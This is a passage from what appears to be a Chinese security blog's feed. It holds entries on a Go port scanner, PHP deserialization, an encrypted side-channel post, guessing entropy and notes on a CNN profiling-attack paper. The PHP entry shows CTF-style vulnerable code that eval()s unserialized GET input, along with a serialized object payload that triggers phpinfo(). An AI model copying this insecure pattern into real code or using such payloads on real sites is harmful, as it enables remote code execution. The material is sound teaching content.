&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">close</span>(ports)</span><br><span class="line">	<span class="keyword">defer</span> <span class="built_in">close</span>(results)</span><br><span class="line">	sort.Ints(open_ports)</span><br><span class="line">	sort.Ints(closed_ports)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, port := <span class="keyword">range</span> open_ports &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;%d is open \n&quot;</span>, port)</span><br><span class="line">	&#125;</span><br><span class="line">	elapsed := time.Since(start) / <span class="number">1e9</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;\n\n%d seconds&quot;</span>, elapsed)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8 seconds</span></span><br></pre></td></tr></table></figure>
<p>   1000个端口,500个资源池,跑出来结果需要8s,而且有的开放的端口还显示的closed,看着之前写的python的多线程跑出结果4s,沉默了.分析流程可得,设置多少个资源池,每次就会先把资源池里的东西跑完,再换下一批,或者是太快了,肉眼看着就一块儿出来的.但结果就是一批一批的出,很显然这不是我想看到的.</p>
<p>   我本身的需求是要在资源池里输入一个,工作完后直接去输出,而不是等所有工作池完成一遍后再全返回到管道</p>
]]></content>
      <categories>
        <category>安全开发</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>php 反序列化学习</title>
    <url>/archives/78de963.html</url>
    <content><![CDATA[<h2 id="魔法函数">魔法函数</h2>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="strong">__construct()：构造函数，此函数会在创建一个类的实例时自动调用。</span></span><br><span class="line"><span class="strong"></span></span><br><span class="line"><span class="strong">__</span>destruct()：析构函数，此函数会在对象的所有引用都被删除或者类被销毁的时候自动调用。</span><br><span class="line"></span><br><span class="line"><span class="strong">__sleep()：执行serialize()函数之前，会检查类中是否存在<span class="emphasis">_sleep()方法。如果存在，该方法会先被调用。</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"></span></span></span><br><span class="line"><span class="emphasis"><span class="strong">_</span><span class="emphasis">_wakeup()：执行unserialize()函数之前，会检查类中是否存在_</span>wakeup()方法。如果存在，则会先调用<span class="emphasis">_wakeup()方法，预先准备对象需要的资源。</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"></span></span></span><br><span class="line"><span class="emphasis"><span class="strong">_</span><span class="emphasis">_toString()：当一个对象被当作一个字符串使用时被调用。例如echo $obj或者拼接字符串时；此方法必须返回一个字符串，否则会产生 E_</span>RECOVERABLE<span class="emphasis">_ERROR 级别的错误。	# 这里echo反序列后的变量也会被调用</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"></span></span></span><br><span class="line"><span class="emphasis"><span class="strong">_</span><span class="emphasis">_get()：在读取不可访问的属性值的时候，此魔法函数会自动调用。</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"></span></span></span><br><span class="line"><span class="emphasis"><span class="strong">_</span><span class="emphasis">_call()：在调用未定义的方法时被调用。</span></span></span><br></pre></td></tr></table></figure>
<h1>例题</h1>
<h2 id="destruct调用">__destruct调用</h2>
<blockquote>
<p>执行反序列后自动会调用该函数</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$var</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;saved_code&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload</p>
<p><code>?saved_code=O:7:&quot;Example&quot;:1:&#123;s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p>
<h2 id="construct调用">__construct调用</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;file)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">strchr</span>(<span class="variable">$this</span>-&gt; file,<span class="string">&quot;\\&quot;</span>)===<span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">strchr</span>(<span class="variable">$this</span>-&gt;file, <span class="string">&#x27;/&#x27;</span>)===<span class="literal">false</span>)</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">dirname</span> (<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>.<span class="variable">$this</span> -&gt;file);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Wrong filename.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt; file=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span> ;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;     </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">  <span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$file</span>); </span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span> <span class="comment">#&lt;!--key in flag.php--&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload</p>
<p>``</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>post_condition_gan-based_DLSCA</title>
    <url>/archives/1b875be8.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="cae606f3383fdf747abcf4c741371f34f874f0d467f5227c185d6e31c7f2ce24">ee733bf2dd71e66968255e3fc5c69a3c16d9a803e9ff265cdd0b4534cc25fb1dab68598a27526621c29525bec1cc20211969058e00be57ed9e677f29e808304f5984c73cb7cb8605f6afbc83bbef5653d4b0d7d599d1575ff63c884454f0c8d715a1af3e96954583ea5f4a61a0d11713f8c7601bef26978d18bc71f9e4183cd6fca2ea32b8960d6df1e3332379f603d2388ee61f04213b082fa8a9af7f0eb942ded237a405f3c5955de5072be0ceb988f217e900d4593b7ec3a1fcea2b31146181d84ead88328738e4a6d2309aa916a7b170868763ec2ed270876faf6361dc47b65517cefad6436139a79b8c8751843626c0c6767b0855c720f50584e73fccc9cc3aff15d768e2791b01ae582d7dd2247964bcc8b440de0d595216fe29538a9b9c6950d424000900917a4a5ef881dc0f372284635810de9d389c36c7b451a70e9645e69da08bc20f99a1b0dcfa0da185eb0d11d7eeee9453d5e4e4b8ce709cb7bc05fac12f19468297dae19cd42050f306fe21bd908228562140e7cd975c92c74f62c725e44a0cc1eae0cdcf7f6e607cdedf5a33f2d2e72028be2de6703440446c5a1d636171f2b0e73bd5aa9dc422f71c35514ce76ea168c6e4ae9756b299da24cfe39b17b7220b1c5141dead82b1b6a146cf7d107c7b342c558b2aed0ebea261a46a6dc506cd0ed157f6e8f6654c785a1cc579e6672495830976270276149926d685c0d4188c24f0752962c460de414e852b9026ec8a1db95736a90d214b0626deffc742d4c2af70083f9da43514d75f4552f4eef96a3ec5925df818210ec403627025a7ba2cfe271a5d80f995eb17a33b4bbdc46e15298995698ca97fec0c8bdcd2c123f313fb8a4c159cc06416db0839132ef0d9d0016f313129b38571f1b3a4bbb38ea24d8068ffaa349feb83a742d976b3590578003ddb0a76a227b92fcbab8ed8f040d8c0f26dd658bcc44db56abdb521a0292be86bbdb696f9f48a868f31d66570a3e92b809247a2ba3c6e1d7d25fb93d219b68317db8986fd7e7d32a78e1a35b54d668b76b8a40b2519cef031de895bd31794a042f7696deba7af71c18577fbb4251dc54fd83ab3bd982a414e6656ffddc13a4cadb92bc6ea9a78618b13bab57951adbb5dc3e43d659852c9608e77f619db75509e46cb11d1846e39727361d866d1399cf1f205db6b760fdfa225f7deadd7a93b33f6683ab1fd4878853c897210e742c33d691df5e3151160a8e864d06b1e641153ed5aa88b789658</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-blink">
      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="这里需要密码,Pay for me !!!.">这里需要密码,Pay for me !!!.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>模型结构</tag>
      </tags>
  </entry>
  <entry>
    <title>猜测熵</title>
    <url>/archives/ccbf847b.html</url>
    <content><![CDATA[<h1>猜测熵</h1>
<blockquote>
<p>最近开始着手复现论文,但发现猜测熵我写不出来,看着公式我用代码推出来的结果跟作者的猜测熵出入很大,怀疑自己对猜测熵的真实含义有些误解,在这里重新记录下来猜测熵的计算。</p>
</blockquote>
<p>时隔一个月来填坑, 果然我写的有错,有时候看别人的论文真不如直接去看代码,但能有多少人把自己的论文开源呢?</p>
<p><strong>以ASCAD固定密钥的数据集为例</strong></p>
<ul>
<li>将测试集输出概率按十个一组划分,(1 000个分为100组) ,此时概率对应的是Sbox(Plaintext ^ key) -&gt; 中间值的概率</li>
<li>初始化概率数组 值全为0,长度为256,$$ 2^8 $$也就是计算一字节密钥值,此时我们拿到的是前十个输出的概率分布,对应模拟出密钥从1到256,将概率log,按次序排放</li>
<li>将十个计算出来的概率分布对应累加,从大到小排序(这里不改变之前的概率分布的排序,只是算出来排序来计算),最后计算得到真实密钥的排名</li>
<li>重复第二、三步,但是不需要初始化概率数组,直接用上一个的就行</li>
</ul>
<p><img src="../img/image-20230721111613596.png" alt="猜测熵"></p>
<p>图中rank也就是之前算出来的排名, 下边的number of trace就是需要多少条能量迹的概率分布累加计算得到对应的rank</p>
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>评价指标</tag>
      </tags>
  </entry>
  <entry>
    <title>文献实验复现笔记-Revisiting a Methodology for Efficient CNN Architectures in Profiling Attacks</title>
    <url>/archives/5816868e.html</url>
    <content><![CDATA[<p>上链接：<a href="https://github.com/i4mhmh/Recurrent-Revisiting-a-Methodology-for-Efficient-CNN-Architectures-in-Profiling-Attacks">https://github.com/i4mhmh/Recurrent-Revisiting-a-Methodology-for-Efficient-CNN-Architectures-in-Profiling-Attacks</a></p>
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>文献实验复现</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-Revisiting a Methodology for Efficient CNN Architectures in Profiling Attacks</title>
    <url>/archives/ddc648f6.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>
<p>作者：<strong>Lennert Wouters, Victor Arribas, Benedikt Gierlichs and Bart Preneel</strong></p>
</li>
<li>
<p>单位：<strong>imec-COSIC, KU Leuven Kasteelpark Arenberg 10, B-3001 Leuven-Heverlee, Belgium</strong></p>
</li>
<li>
<p>出处：<strong>IACR Transactions on Cryptographic Hardware and Embedded Systems</strong></p>
</li>
<li>
<p>标题：<strong>Revisiting a Methodology for Efficient CNN Architectures in Profiling Attacks</strong></p>
</li>
</ul>
<h1>文章内容</h1>
<h2 id="研究背景">研究背景</h2>
<p>本文主要针对于Zaid在2020年发表论文中的部分论点进行实验取证，构造了不同的网络结构，不同的超参数。</p>
<h2 id="前置知识">前置知识</h2>
<h3 id="数据集">数据集</h3>
<ul>
<li>ASCAD</li>
<li>DPAv4</li>
<li>AES_HD</li>
<li>AES_RD</li>
</ul>
<h3 id="数据预处理">数据预处理</h3>
<p>针对于时间序列分类任务，通常在训练模型之前需要对数据进行预处理，在针对设备进行侧信道攻击时，对于同一种加密操作，同种设备会因电压、温度、测量设备等外界因素而产生细微不同的结果，将采集到的数据通过缩放预处理可以减轻这些噪声带来的影响，在本文中作者最后采用横向预处理技术对数据进行增强。</p>
<h3 id="可视化技术">可视化技术</h3>
<p>在模型训练时是无法直接观测到神经网络的具体工作细节的，为了找到对模型结果影响较大的特征点，引入可视化技术来计算输入特征的重要程度。</p>
<p>对于权重可视化方法，主要是针对于展平层FL之后的第一个全连接层：</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>W</mi><mi>m</mi><mrow><mi>v</mi><mi>i</mi><mi>s</mi></mrow></msubsup><mo>=</mo><mfrac><mn>1</mn><msubsup><mi>n</mi><mi>f</mi><mrow><mo stretchy="false">[</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>t</mi><mi>e</mi><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup></mfrac><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mi>i</mi><mo>×</mo><msubsup><mi>n</mi><mi>f</mi><mrow><mo stretchy="false">[</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>t</mi><mi>e</mi><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup></mrow><mrow><mo stretchy="false">(</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><msubsup><mi>n</mi><mi>f</mi><mrow><mo stretchy="false">[</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>t</mi><mi>e</mi><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup></mrow></msubsup><mi mathvariant="normal">∣</mi><msubsup><mi>W</mi><mi>m</mi><mrow><mo stretchy="false">[</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>t</mi><mi>e</mi><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">W^{vis}_m = \frac{1}{n^{[flatten-1]}_f} \sum_{j=i \times n_{f}^{[flatten-1]}}^{(i+1)\times n_{f}^{[flatten-1]}} |W_{m}^{[flatten+1]}[j]| //</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0717em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-2.453em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.3233em;vertical-align:-0.8968em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.4486em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0591em;"><span style="top:-2.1885em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span><span style="top:-3.0591em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">tt</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4861em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8916em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4264em;"><span style="top:-2.1848em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7414em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">×</span><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0591em;"><span style="top:-2.1885em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span><span style="top:-3.0591em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">tt</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4861em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.4264em;margin-right:0.05em;"><span class="pstrut" style="height:2.7414em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mbin mtight">×</span><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0591em;"><span style="top:-2.1885em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span><span style="top:-3.0591em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">tt</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4861em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8968em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">tt</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mord">∣//</span></span></span></span></p>
<p>这里<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>W</mi><mi>m</mi><mrow><mi>v</mi><mi>i</mi><mi>s</mi></mrow></msubsup><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">W^{vis}_{m}[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0747em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-2.453em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span>是点<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span>处 相对于全连接层的第m个神经元的权重<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi></mrow><annotation encoding="application/x-tex">W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>∈</mo><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mi>l</mi><mi>e</mi><mi>n</mi><mo stretchy="false">(</mo><mo stretchy="false">[</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>t</mi><mi>e</mi><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">i \in [0, len([flatten - 1])]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6986em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mopen">([</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">tt</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">])]</span></span></span></span>, 这里[flatten -1 ]代表flatten层前的卷积层，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>n</mi><mi>f</mi><mrow><mo stretchy="false">[</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>t</mi><mi>e</mi><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">n_{f}^{[flatten - 1]}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4822em;vertical-align:-0.4374em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.3987em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">tt</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4374em;"><span></span></span></span></span></span></span></span></span></span>也就是卷积层的过滤器数量，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>W</mi><mi>m</mi><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msubsup></mrow><annotation encoding="application/x-tex">W_{m}^{flaten+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0961em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.453em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 